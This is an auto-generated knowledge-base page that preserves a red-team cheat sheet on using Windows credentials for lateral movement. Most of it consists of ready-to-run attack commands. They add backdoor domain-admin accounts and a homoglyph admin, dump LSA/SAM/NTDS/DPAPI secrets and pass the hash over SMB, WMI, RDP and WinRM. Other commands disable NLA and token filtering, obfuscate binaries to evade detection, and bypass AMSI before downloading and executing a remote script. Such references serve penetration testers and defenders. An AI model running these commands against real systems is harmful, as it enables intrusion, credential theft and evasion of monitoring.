---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Windows - Using credentials

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-windows-using-credentials` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/windows-using-credentials.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows - Using credentials](../../topics/redteam/windows-using-credentials.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-access-windows-using-credentials |
| name | Windows - Using credentials |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/windows-using-credentials.md |

## Preserved Source Material

````yaml
_body: "# Windows - Using credentials\n\n## Summary\n\n* [Get Credentials](#get-credentials)\n    * [Create Credential](#create-credential)\n\
  \    * [Looting Credentials](#looting-credentials)\n    * [Guest Credential](#guest-credential)\n    * [Retail Credential](#retail-credential)\n\
  \    * [Sandbox Credential](#sandbox-credential)\n* [NetExec](#netexec)\n* [Impacket](#impacket)\n    * [PSExec](#psexec)\n\
  \    * [WMIExec](#wmiexec)\n    * [SMBExec](#smbexec)\n* [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)\n*\
  \ [Powershell Remoting Protocol](#powershell-remoting-protocol)\n    * [Powershell Credentials](#powershell-credentials)\n\
  \    * [Powershell PSSESSION](#powershell-pssession)\n    * [Powershell Secure String](#powershell-secure-string)\n* [SSH\
  \ Protocol](#ssh-protocol)\n* [WinRM Protocol](#winrm-protocol)\n* [WMI Protocol](#wmi-protocol)\n* [Other Methods](#other-methods)\n\
  \    * [PsExec - Sysinternals](#psexec---sysinternals)\n    * [Mount a remote share](#mount-a-remote-share)\n    * [Run\
  \ as another user](#run-as-another-user)\n\n## Get Credentials\n\n### Create Credential\n\n```powershell\nnet user hacker\
  \ Hcker_12345678* /add /Y\nnet localgroup administrators hacker /add\nnet localgroup \"Remote Desktop Users\" hacker /add\
  \ # RDP access\nnet localgroup \"Backup Operators\" hacker /add # Full access to files\nnet group \"Domain Admins\" hacker\
  \ /add /domain\n\n# enable a domain user account\nnet user hacker /ACTIVE:YES /domain\n\n# prevent users from changing their\
  \ password\nnet user username /Passwordchg:No\n\n# prevent the password to expire\nnet user hacker /Expires:Never\n\n# create\
  \ a machine account (not shown in net users)\nnet user /add evilbob$ evilpassword\n\n# homoglyph Aԁmіnistratοr (different\
  \ of Administrator)\nAԁmіnistratοr\n```\n\nSome info about your user\n\n```powershell\nnet user /dom\nnet user /domain\n\
  ```\n\n### Looting Credentials\n\n```ps1\nnxc smb 10.10.10.10 -u username -p password -d domain --lsa\nnxc smb 10.10.10.10\
  \ -u username -p password -d domain --sam\nnxc smb 10.10.10.10 -u username -p password -d domain --dpapi nosystem\nnxc smb\
  \ 10.10.10.10 -u username -p password -d domain --dpapi cookies\nnxc smb 10.10.10.10 -u username -p password -d domain --dpapi\n\
  nxc smb 10.10.10.10 -u username -p password -d domain --sccm\nnxc smb 10.10.10.10 -u username -p password -d domain --ntds\n\
  nxc smb 10.10.10.10 -u username -p password -d domain -M lsassy\nnxc smb 10.10.10.10 -u username -p password -d domain -M\
  \ nanodump\nnxc smb 10.10.10.10 -u username -p password -d domain -M veeam\nnxc smb 10.10.10.10 -u username -p password\
  \ -d domain -M winscp\nnxc smb 10.10.10.10 -u username -p password -d domain -M putty\nnxc smb 10.10.10.10 -u username -p\
  \ password -d domain -M vnc\nnxc smb 10.10.10.10 -u username -p password -d domain -M mremoteng\nnxc smb 10.10.10.10 -u\
  \ username -p password -d domain -M rdcman\n```\n\n### Guest Credential\n\nBy default every Windows machine comes with a\
  \ Guest account, its default password is empty.\n\n```powershell\nUsername: Guest\nPassword: [EMPTY]\nNT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0\n\
  ```\n\n### Retail Credential\n\nRetail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)\n\
  \nwhen you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin\n\n```powershell\n\
  Username: RetailAdmin\nPassword: trs10\n```\n\n### Sandbox Credential\n\nWDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)\n\
  \nStarting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard\n\n```powershell\n\
  \\\\windowssandbox\nUsername: wdagutilityaccount\nPassword: pw123\n```\n\n## netexec\n\nUsing [mpgn/netexec](https://github.com/Pennyw0rth/NetExec)\n\
  \n* netexec supports many protocols\n\n    ```powershell\n    netexec ldap 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\
  \ \n    netexec mssql 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\n    netexec rdp 192.168.1.100\
  \ -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\" \n    netexec smb 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\
  \n    netexec winrm 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\n    ```\n\n* netexec works\
  \ with password, NT hash and Kerberos authentication\n\n    ```powershell\n    netexec smb 192.168.1.100 -u Administrator\
  \ -p \"Password123?\" # Password\n    netexec smb 192.168.1.100 -u Administrator -H \":31d6cfe0d16ae931b73c59d7e0c089c0\"\
  \ # NT Hash\n    export KRB5CCNAME=/tmp/kerberos/admin.ccache; netexec smb 192.168.1.100 -u admin --use-kcache # Kerberos\n\
  \    ```\n\n## Impacket\n\nFrom [fortra/impacket](https://github.com/fortra/impacket) (:warning: renamed to impacket-xxxxx\
  \ in Kali)\n:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.\n:warning:\
  \ French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.\n:warning: By default,\
  \ Impacket's scripts are stored in the examples folder: `impacket/examples/psexec.py`.\n\nAll Impacket's *exec scripts are\
  \ not equal, they will target services hosted on multiples ports.\nThe following table summarize the port used by each scripts.\n\
  \n| Method      | Port Used                             | Admin Required |\n|-------------|---------------------------------------|----------------|\n\
  | psexec.py   | tcp/445                               | Yes            |\n| smbexec.py  | tcp/445                      \
  \         | No             |\n| atexec.py   | tcp/445                               | No             |\n| dcomexec.py |\
  \ tcp/135, tcp/445, tcp/49751 (DCOM)    | No             |\n| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) | Yes\
  \            |\n\n* `psexec`: equivalent of Windows PSEXEC using RemComSvc binary.\n\n    ```ps1\n    psexec.py DOMAIN/username:password@10.10.10.10\n\
  \    ```\n\n* `smbexec`: a similar approach to PSEXEC w/o using RemComSvc\n\n    ```ps1\n    smbexec.py DOMAIN/username:password@10.10.10.10\n\
  \    ```\n\n* `atexec`: executes a command on the target machine through the Task Scheduler service and returns the output\
  \ of the executed command.\n\n    ```ps1\n    atexec.py DOMAIN/username:password@10.10.10.10\n    ```\n\n* `dcomexec`: a\
  \ semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints\n\n    ```ps1\n    dcomexec.py DOMAIN/username:password@10.10.10.10\n\
  \    ```\n\n* `wmiexec`: a semi-interactive shell, used through Windows Management Instrumentation. First it uses ports\
  \ tcp/135 and tcp/445, and ultimately it communicates with the Winmgmt Windows service over dynamically allocated high port\
  \ such as tcp/50911.\n\n    ```ps1\n    wmiexec.py DOMAIN/username:password@10.10.10.10\n    wmiexec.py DOMAIN/username@10.10.10.10\
  \ -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n    ```\n\nTo allow Non-RID 500 local admin\
  \ accounts performing Wmi or PsExec, execute:\n`reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\
  \ /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1`\nTo prevent RID 500 from being able to WmiExec or PsExec, execute:\n\
  `reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v FilterAdministratorToken /t REG_DWORD /f\
  \ /d 1`\n\n### PSExec\n\nInstead of uploading `psexeccsv` service binary, it uploads to `ADMIN$` a service binary with an\
  \ arbitrary name.\nPSExec default [kavika13/RemCom](https://github.com/kavika13/RemCom) binary is 10 years old, you might\
  \ want to rebuild it and obfuscate it to reduce detections ([snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb))\n\
  \nUse a custom binary and service name with : `psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name\
  \ custombin.exe`\n\nAlso a custom file can be specified with the parameter : `-file /tmp/RemComSvcCustom.exe`.\nYou need\
  \ to update the pipe name to match \"Custom_communication\" in the line 163\n\n```py\n162    tid = s.connectTree('IPC$')\n\
  163    fid_main = self.openPipe(s,tid,r'\\RemCom_communicaton',0x12019f)\n```\n\nAlternatively you can use the fork [ThePorgs/impacket](https://github.com/ThePorgs/impacket/pull/3/files).\n\
  \n### WMIExec\n\nUse a non default share `-share SHARE` to write the output to reduce the detection.\nBy default this command\
  \ is executed:\n\n```ps1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__RANDOM 2>&1\n```\n\n### SMBExec\n\nIt creates a service\
  \ with the name `BTOBTO` ([smbexec.py#L59](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L59)) and\
  \ transfers commands from the attacker in a bat file in `%TEMP/execute.bat` ([smbexec.py#L56](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L56)).\n\
  \n```py\nOUTPUT_FILENAME = '__output'\nBATCH_FILENAME  = 'execute.bat'\nSMBSERVER_DIR   = '__tmp'\nDUMMY_SHARE     = 'TMP'\n\
  SERVICE_NAME    = 'BTOBTO'\n```\n\nIt will create a new service every time we execute a command. It will also generate an\
  \ Event 7045.\n\nBy default this command is executed: `%COMSPEC% /Q /c echo dir > \\\\127.0.0.1\\C$\\__output 2>&1 > %TEMP%\\\
  execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat`, where `%COMSPEC%` points to `C:\\WINDOWS\\\
  system32\\cmd.exe`.\n\n```py\nclass RemoteShell(cmd.Cmd):\n    def __init__(self, share, rpc, mode, serviceName, shell_type):\n\
  \        cmd.Cmd.__init__(self)\n        self.__share = share\n        self.__mode = mode\n        self.__output = '\\\\\
  \\\\127.0.0.1\\\\' + self.__share + '\\\\' + OUTPUT_FILENAME\n        self.__batchFile = '%TEMP%\\\\' + BATCH_FILENAME\n\
  \        self.__outputBuffer = b''\n        self.__command = ''\n        self.__shell = '%COMSPEC% /Q /c '\n        self.__shell_type\
  \ = shell_type\n        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '\n        self.__serviceName\
  \ = serviceName\n```\n\n## RDP Remote Desktop Protocol\n\n:warning: **NOTE**: You may need to enable RDP and disable NLA\
  \ and fix CredSSP errors.\n\n* Enable RDP\n\n    ```powershell\n    PS C:\\> reg add \"HKLM\\System\\CurrentControlSet\\\
  Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f\n    PS C:\\> netsh firewall set service\
  \ remoteadmin enable\n    PS C:\\> netsh firewall set service remotedesktop enable\n\n    # Alternative\n    C:\\> psexec\
  \ \\\\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD\
  \ /d 0\n    root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable\n\
  \    ```\n\n* Fix **CredSSP** errors\n\n    ```ps1\n    reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\\
  Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n    reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\\
  Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\n    ```\n\n**Network Level\
  \ Authentication** requires the user to authenticate before a remote desktop session is fully established. This happens\
  \ before the remote desktop interface is loaded, reducing the risk of certain attacks.\n\n* Take screenshot when NLA is\
  \ disabled\n\n    ```ps1\n    netexec rdp 10.10.10.10 -u user -p pass --nla-screenshot\n    ```\n\n* Disable Network Level\
  \ Authentication (NLA)\n\n    ```ps1\n    PS > (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\\
  terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").UserAuthenticationRequired\n    PS > (Get-WmiObject\
  \ -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\"\
  ).SetUserAuthenticationRequired(0)\n    ```\n\nOn Windows, the native Remote Desktop client is `mstsc.exe`.\nWhen launched\
  \ with the `/public` switch, RDP runs in Public Mode, which uses temporary, non-persistent session settings.\n\n```ps1\n\
  mstsc /public /v:server01\n```\n\nPublic Mode is designed for shared systems, jump hosts, and security-sensitive environments,\
  \ where leaving local artifacts or cached credentials would present an operational risk.\n\nWhen RDP is launched in Public\
  \ Mode, the client will:\n\n* Not save credentials\n* Not use cached credentials\n* Not save connection history\n* Not load\
  \ local RDP settings (printers, drives, clipboard, etc.)\n* Not store passwords in Credential Manager\n\nIf RDP was launched\
  \ without /public, local artifacts may persist.\nThese can be manually removed using the following PowerShell commands.\n\
  \n```ps1\n# Remove Stored RDP Credentials\ncmdkey /list | ? { $_ -Match \"TERMSRV/\" } | % { $_ -Replace \".*: \" } | %\
  \ { cmdkey /delete:$_ }\n\n# Remove Cached Bitmaps and Client Data\nRemove-Item -Path \"$Env:LocalAppData\\Microsoft\\Terminal\
  \ Server Client\\Cache\" -Recurse -ErrorAction SilentlyContinue\n\n# Remove RDP Connection History and Device Mappings\n\
  Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default\" -Force -ErrorAction SilentlyContinue\n\
  Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\" -Recurse -Force -ErrorAction SilentlyContinue\n\
  Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Terminal Server Client\\LocalDevices\" -Recurse -Force -ErrorAction SilentlyContinue\n\
  ```\n\nAbuse RDP protocol to execute commands remotely with the following commands:\n\n* [Pennyw0rth/netexec](https://github.com/Pennyw0rth/NetExec)\n\
  \n    ```ps1\n    netexec rdp 10.10.10.10 -u user -p pass\n    ```\n\n* [rdesktop](http://www.rdesktop.org/)\n\n    ```powershell\n\
  \    root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare\n    root@payload$\
  \ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10\n    # -g : the screen will take up 70%\
  \ of your actual screen size\n    # -r disk:share : sharing a local folder during a remote desktop session \n    ```\n\n\
  * [freerdp](https://www.freerdp.com)\n\n    ```powershell\n    root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!'\
  \ +clipboard /cert-ignore /size:1366x768 /smart-sizing\n    root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will\
  \ be asked\n    \n    # pass the hash using Restricted Admin, need an admin account not in the \"Remote Desktop Users\"\
  \ group.\n    # pass the hash works for Server 2012 R2 / Win 8.1+\n    # require freerdp2-x11 freerdp2-shadow-x11 packages\
  \ instead of freerdp-x11\n    root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d\
  \  \n    ```\n\n* [0xthirteen/SharpRDP](https://github.com/0xthirteen/SharpRDP)\n\n    ```powershell\n    PS C:\\> SharpRDP.exe\
  \ computername=target.domain command=\"C:\\Temp\\file.exe\" username=domain\\user password=password\n    ```\n\n## Powershell\
  \ Remoting Protocol\n\n### Powershell Credentials\n\n```ps1\nPS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText\
  \ -Force\nPS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\\Username', $pass)\n```\n\n### Powershell\
  \ PSSESSION\n\n* Enable PSRemoting on the host\n\n    ```ps1\n    Enable-PSRemoting -Force\n    net start winrm  \n\n  \
  \  # Add the machine to the trusted hosts\n    Set-Item wsman:\\localhost\\client\\trustedhosts *\n    Set-Item WSMan:\\\
  localhost\\Client\\TrustedHosts -Value \"10.10.10.10\"\n    ```\n\n* Execute a single command\n\n    ```powershell\n   \
  \ PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }\n    PS> Invoke-Command -computername DC01,CLIENT1\
  \ -scriptBlock { Get-Service }\n    PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\\Scripts\\Task.ps1\n    ```\n\
  \n* Interact with a PS Session\n\n    ```powershell\n    PS> Enter-PSSession -computerName DC01\n    [DC01]: PS>\n\n   \
  \ # one-to-one execute scripts and commands\n    PS> $Session = New-PSSession -ComputerName CLIENT1\n    PS> Invoke-Command\
  \ -Session $Session -scriptBlock { $test = 1 }\n    PS> Invoke-Command -Session $Session -scriptBlock { $test }\n    1\n\
  \    ```\n\n### Powershell Secure String\n\n```ps1\n$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88,\
  \ 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)\n$secureObject = ConvertTo-SecureString\
  \ -String \"76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=\" -Key $aesKey\n$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)\n\
  $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)\n$decrypted\n```\n\n## WinRM Protocol\n\
  \n**Requirements**:\n\n* Port **5985** or **5986** open.\n* Default endpoint is **/wsman**\n\nIf WinRM is disabled on the\
  \ system you can enable it using: `winrm quickconfig`\n\nThe easiest way to interact over WinRM on Linux is with [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)\n\
  \n```powershell\nevil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c\
  \ PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]\nevil-winrm -i 10.0.0.20 -u username -H HASH\nevil-winrm -i 10.0.0.20\
  \ -u username -p password -r domain.local\n\n*Evil-WinRM* PS > Bypass-4MSI\n*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString(\"\
  http://127.0.0.1/PowerView.ps1\"))\n```\n\n## WMI Protocol\n\n```powershell\nPS C:\\> wmic /node:target.domain /user:domain\\\
  user /password:password process call create \"C:\\Windows\\System32\\calc.exe”\n```\n\n## SSH Protocol\n\n:warning: You\
  \ cannot pass the hash to SSH\n\n* Connect using username/password of a Domain User\n\n    ```ps1\n    ssh -l user@domain\
  \ 192.168.1.1\n    ```\n\n* Connect with a Kerberos ticket\n\n    ```ps1\n    cp user.ccache /tmp/krb5cc_1045\n    ssh -o\
  \ GSSAPIAuthentication=yes user@domain.local -vv\n    ```\n\n## Other Methods\n\n### PsExec - Sysinternals\n\nFrom Windows\
  \ - [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)\n\n```powershell\nPsExec.exe  \\\\srv01.domain.local\
  \ -u DOMAIN\\username -p password cmd.exe\n\n# switch admin user to NT Authority/System\nPsExec.exe  \\\\srv01.domain.local\
  \ -u DOMAIN\\username -p password cmd.exe -s \n```\n\nSysinternals can be installed using the Windows Package Manager or\
  \ downloaded from [live.sysinternals.com](https://live.sysinternals.com/).\n\n```ps1\nwinget install --id Microsoft.Sysinternals.Suite\n\
  winget install Microsoft.sysinternals --accept-source-agreements --accept-package-agreements \n```\n\n### Mount a remote\
  \ share\n\n```powershell\nnet use \\\\srv01.domain.local /user:DOMAIN\\username password C$\n```\n\n### Run as another user\n\
  \nRunas is a command-line tool that is built into Windows Vista.\nAllows a user to run specific tools and programs with\
  \ different permissions than the user's current logon provides.\n\n```powershell\nrunas /netonly /user:DOMAIN\\username\
  \ \"cmd.exe\"\nrunas /noprofil /netonly /user:DOMAIN\\username cmd.exe\n```\n\n## References\n\n* [Ropnop - Using credentials\
  \ to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)\n* [Ropnop - Using credentials\
  \ to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)\n\
  * [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)\n\
  * [Impacket Remote code execution on Windows from Linux by Vry4n_ - Jun 20, 2021](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)\n\
  * [Impacket Exec Commands Cheat Sheet - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)\n\
  * [SMB protocol cheatsheet - aas-s3curity](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/lateral-movement/smb-protocol)\n\
  * [Windows Lateral Movement with smb, psexec and alternatives - nv2lt](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)\n\
  * [PsExec.exe IOCs and Detection - Threatexpress](https://threatexpress.com/redteaming/tool_ioc/psexec/)\n* [A Dive on SMBEXEC\
  \ - dmcxblue - 8th Feb 2021](https://0x00sec.org/t/a-dive-on-smbexec/24961)"
_relative_path: redteam/access/windows-using-credentials.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/windows-using-credentials.md
````
